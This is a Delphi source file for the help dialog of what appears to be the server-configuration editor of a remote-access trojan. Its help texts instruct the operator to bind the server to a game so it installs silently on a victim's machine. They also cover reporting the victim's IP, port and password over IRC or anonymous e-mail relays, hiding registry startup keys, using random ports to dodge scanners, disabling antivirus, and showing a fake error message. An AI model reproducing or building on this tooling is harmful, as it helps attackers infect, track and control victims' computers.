unit HelpUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, OutlookBtn, TFlatEditUnit,
  TFlatRadioButtonUnit;

type
  TGiveHelp = class(TForm)
    CaptionLabel: TLabel;
    CloseButton: TFlatSpeedButton;
    Memo1: TMemo;
    Panel1: TPanel;
    Label19: TLabel;
    FlatSpeedButton1: TFlatSpeedButton;
    FlatSpeedButton5: TFlatSpeedButton;
    FlatSpeedButton4: TFlatSpeedButton;
    FlatSpeedButton3: TFlatSpeedButton;
    FlatSpeedButton2: TFlatSpeedButton;
    Label20: TLabel;
    FlatRadioButton1: TFlatRadioButton;
    FlatRadioButton2: TFlatRadioButton;
    FlatRadioButton3: TFlatRadioButton;
    FlatRadioButton6: TFlatRadioButton;
    FlatRadioButton5: TFlatRadioButton;
    FlatRadioButton4: TFlatRadioButton;
    FlatEdit9: TFlatEdit;
    FlatEdit10: TFlatEdit;
    Label18: TLabel;
    Label17: TLabel;
    OutlookBtn25: TOutlookBtn;
    OutlookBtn26: TOutlookBtn;
    procedure FormCreate(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormShow(Sender: TObject);
    procedure FormHide(Sender: TObject);
    procedure OutlookBtn25Click(Sender: TObject);
    procedure OutlookBtn26Click(Sender: TObject);
    procedure FormPaint(Sender: TObject);
  private
    procedure WMNCHitText(var Msg:TWMNCHitTest);message WM_NCHITTEST;
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    procedure SetTheColors;
  end;

var
  GiveHelp: TGiveHelp;
  CIcon:Integer;
  IconConst : array [0..4] of integer=(0, MB_ICONEXCLAMATION,
         MB_ICONINFORMATION, MB_ICONSTOP,  MB_ICONQUESTION);
  
implementation

uses EditUnit;

{$R *.DFM}

function Merge(x,y,x1,y1,x2,y2:integer):Boolean;
begin
 if ((x>=x1) and (x<=x2)) and ((y>=y1) and (y<=y2)) then result:=true else result:=false;
end;
var KeepX,KeepY:Integer;
procedure TGiveHelp.WMNCHitText(var Msg:TWMNCHitTest);
const Corner=5;
      OffSet=3;
begin
  inherited; if tag=7 then exit;
 with msg do begin
{  if (Merge(xpos,ypos ,Left+MinimizeButton.Left,Top+MinimizeButton.Top,Left+MinimizeButton.Left+MinimizeButton.Width,Top+MinimizeButton.Top+MinimizeButton.Height)) then exit;}
  if (Merge(xpos,ypos ,Left+CloseButton.Left,Top+CloseButton.Top,Left+CloseButton.Left+CloseButton.Width,Top+CloseButton.Top+CloseButton.Height)) then exit;
 end;
 if (Msg.Result = HTCLIENT) then
  with msg do begin
  if (Merge(xpos,ypos ,Left         ,top+Corner        ,left+Offset       ,top+height-Corner)) then Result := htLeft;
  if (Merge(xpos,ypos ,Left+width-Offset ,top+Corner        ,left+width   ,top+height-Corner)) then Result := htRight;
  if (Merge(xpos,ypos ,Left+Corner       ,top          ,left+width-Corner ,top+Offset       )) then Result := htTop;
  if (Merge(xpos,ypos ,Left+Corner       ,top+height-Offset ,left+width-Corner ,top+height  )) then Result := htBottom;
  if (Merge(xpos,ypos ,Left,Top,Left+Corner,Top+Corner)) then Result:=htTopLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top,Left+Width,Top+Corner)) then Result:=htTopRight;
  if (Merge(xpos,ypos ,Left,Top+Height-Corner,Left+Corner,Top+Height)) then REsult:=htBottomLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top+Height-Corner,Left+Width,Top+Height)) then Result:=htBottomRight;
{  if (Merge(xpos,ypos ,Left+CaptionLabel.Left,Top+CaptionLabel.Top,Left+CaptionLabel.Left+CaptionLabel.Width,Top+CaptionLabel.Top+CaptionLabel.Height)) then Result:=htCaption;}
 end;
end;

procedure TGiveHelp.SetTheColors;
begin
// myShape.Brush.Color:=cFormBackground;
// myShape.Pen.Color:=cFormLine;
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  Glyph.Assign(EditForm.bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
  Top:=5;
 end;
 Memo1.Color:=cFormForeground;
 Memo1.Font.Color:=cFormText;
 Panel1.Color:=cFormBackground;
 with FlatSpeedButton1 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton2 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton3 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton4 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 with FlatSpeedButton5 do begin Color:=cFormBackground;ColorBorder:=cFormCaption;Font.Color:=cFormText;ColorDown:=cFormForeground;
  ColorFocused:=cFormCaption;ColorHighlight:=cFormLine;ColorShadow:=cFormLine;end;
 Label17.Font.Color:=cFormText;Label18.Font.Color:=cFormText;
 Label19.Font.Color:=cFormText;Label20.Font.Color:=cFormText;
 with FlatEdit9 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with FlatEdit10 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormForeground;ColorFocused:=cFormBackground;end;
 with FlatRadioButton1 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton2 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton3 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton4 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton5 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 with FlatRadioButton6 do begin Color:=cFormBackground;ColorDot:=cFormCaption;
  ColorBorder:=cFormLine;Font.Color:=cFormText;ColorDown:=cFormLine;ColorFocused:=cFormForeground;end;
 Invalidate;
end;

procedure TGiveHelp.FormCreate(Sender: TObject);
begin
 SetTheColors;
end;

procedure TGiveHelp.CloseButtonClick(Sender: TObject);
begin
 Hide;
end;

procedure TGiveHelp.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure TGiveHelp.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TGiveHelp.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TGiveHelp.FormShow(Sender: TObject);
begin
 Invalidate;
 Memo1.Lines.Clear;
 case TAG of
  1:begin
     Memo1.Lines.Add('IRC notify help');
     Memo1.Lines.Add('---');
     Memo1.Lines.Add('if you enable this feature, you''ll have to specify an IRC server and port. enter the server you usually hang out on.');
     Memo1.Lines.Add('you can retrieve the server name and port from your mIRC client [if you use mIRC]. on connect options, in mIRC, above the ''Connect to IRC server!'' button, click on ''Edit''. that will give you the IRC server and Port.');
     Memo1.Lines.Add('now for the nickname/channel. if you enter a nickname [eg. Foo], then the server connects to the irc server, and sends Foo a message with the current ip, port, password and victim name.');
     Memo1.Lines.Add('if you enter a channel [eg. #mychannel], then the server connects to the irc server, joins #mychannel and sends the same message to the entire channel.');
     Memo1.Lines.Add('---');
    end;
  2:begin
     Memo1.Lines.Add('E-mail notify help');
     Memo1.Lines.Add('---');
     Memo1.Lines.Add('the most difficult part about this feature is the email server. if you know for sure of an anonymous email server that allows relays, then enter it. if you don''t, then just pick any server from the list and leave the User id field blank.');
     Memo1.Lines.Add(' then click the ''test'' buton to try to send an email through the specified server.');
     Memo1.Lines.Add('if you receive an email message, then the server is ok, and you can safely use it.');
    end;
  3:begin
     Memo1.Lines.Add('key name help');
     Memo1.Lines.Add('---');
     Memo1.Lines.Add('when you use one of the registry startup methods, you must specify a key name that should be used in the registry. it can be any type of text.');
     Memo1.Lines.Add('just make sure you don''t use ''trojan'' or ''rat'' or anything similar. use instead ''BackdoorProgram'' :)');
    end;
  4:begin
     Memo1.Lines.Add('exe binder');
     Memo1.Lines.Add('---');
     Memo1.Lines.Add('ok, this is pretty easy.');
     Memo1.Lines.Add('specify manually a file name that you would like to bind with the server, or click browse to pick it');
     Memo1.Lines.Add('once you bind an exe file with the server, the EXE file is added to the server. so you send SERVER.EXE to the victim, not the exe you binded.');
     Memo1.Lines.Add('that''s kinda'' confusing... anyway, when the victim runs the server, and the server is binded with an exe, the EXE file will be executed, and the server will install itself in memory.');
     Memo1.Lines.Add('for example: you can bind the server with a small little game, and when the victim runs it, that small little game will start, and the server will install in the background.');
     Memo1.Lines.Add('---');
     Memo1.Lines.Add('if you wanna bind more than one file, just zip all the files you wanna bind into a Self-Extracting zip archive, and patch it with the server.');
    end;
  5:begin
     Memo1.Lines.Add('EditServer password protect');
     Memo1.Lines.Add('---');
     Memo1.Lines.Add('well, this new feature allows you to protect the server options. for example, if you send the server to a victim, and the victim has EditServer, he or she won''t be able to edit the server [and see the settings] without your password.');
     Memo1.Lines.Add('you should password protect the server, otherwise the victim might find out your ICQ-UIN or email by editing it with EditServer.');
    end;
  6:begin
     Memo1.Lines.Add('random port');
     Memo1.Lines.Add('---');
     Memo1.Lines.Add('if you check this box, the server will start on a random port. this is useful if you want to protect the server from being detected by ip or port scanners.');
     Memo1.Lines.Add('*note: you''re gonna have to completely rely on the ip-notification. otherwise you''re not gonna know the port of the server. irc-notification is recommended.');
    end;
  7:begin
     CaptionLabel.Caption:='configure fake error message';
     GiveHelp.Height:=260;
     GiveHelp.Width:=292;
     Memo1.Visible:=False;
     Panel1.Visible:=True;
    end;
  8:begin
     Memo1.Lines.Add('opening servers');
     Memo1.Lines.Add('---');
     Memo1.Lines.Add('if you encounter problems while reading the settings of a server, [if EditServer hangs, or doesn''t read anything] then this is most likely caused by anti-virus monitors installed on your system.');
     Memo1.Lines.Add('so make _sure_ you deactivate them before editing the server.');
    end;
  9:begin
     Memo1.Lines.Add('startup methods');
     Memo1.Lines.Add('---');
     Memo1.Lines.Add('if the victim is an experienced windows user, then use the ''less'' or ''not known method''. if the victim has no experience with startup methods, then use the other ones.');
    end;
 end;
end;

procedure TGiveHelp.FormHide(Sender: TObject);
begin
 Memo1.Visible:=True;
 Panel1.Visible:=False;
 CaptionLabel.Caption:='additional help';
end;

procedure TGiveHelp.OutlookBtn25Click(Sender: TObject);
var TSum : LongInt;
    MCapt, MText : PChar;
    MT, RT : string;
    i : integer;
begin
 TSum:=0;
 if FlatRadioButton2.Checked then TSum:=MB_ABORTRETRYIGNORE;
 if FlatRadioButton3.Checked then TSum:=MB_OKCANCEL;
 if FlatRadioButton4.Checked then TSum:=MB_RETRYCANCEL;
 if FlatRadioButton5.Checked then TSum:=MB_YESNO;
 if FlatRadioButton6.Checked then TSum:=MB_YESNOCANCEL;
 if FlatSpeedButton1.Down then CIcon:=0;
 if FlatSpeedButton5.Down then CIcon:=1;
 if FlatSpeedButton4.Down then CIcon:=2;
 if FlatSpeedButton3.Down then CIcon:=3;
 if FlatSpeedButton2.Down then CIcon:=4;

 TSum:=TSum+IconConst[CIcon];
 getMem (MCapt, 100);
 StrPCopy (MCapt, FlatEdit9.Text);
 RT:='';
 MT:=FlatEdit10.Text;
 for i:=1 to Length (MT) do
  if MT[i]='|' then RT:=RT+chr(13)+chr(10) else RT:=RT+MT[i];
 getMem (MText, 500);
 StrPCopy (MText, RT);
 MessageBox (Handle, MText, MCapt, TSum);
 freeMem (MText);
 freeMem (MCapt);
end;

procedure TGiveHelp.OutlookBtn26Click(Sender: TObject);
begin
 Hide;
end;

procedure TGiveHelp.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),EditForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),EditForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),EditForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),EditForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),EditForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),EditForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),EditForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),EditForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=EditForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

end.
